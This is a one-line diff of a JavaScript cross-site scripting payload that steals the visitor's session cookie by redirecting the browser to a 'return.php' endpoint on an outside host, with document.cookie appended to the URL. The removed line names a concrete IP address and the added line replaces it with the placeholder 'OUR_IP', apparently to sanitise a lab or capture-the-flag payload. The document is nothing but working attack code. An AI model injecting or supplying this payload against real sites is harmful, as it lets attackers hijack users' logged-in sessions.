@@ -1,1 +1,1 @@
-document.location='http://165.232.60.95/return.php?c='+document.cookie;
+document.location='http://OUR_IP/return.php?c='+document.cookie;
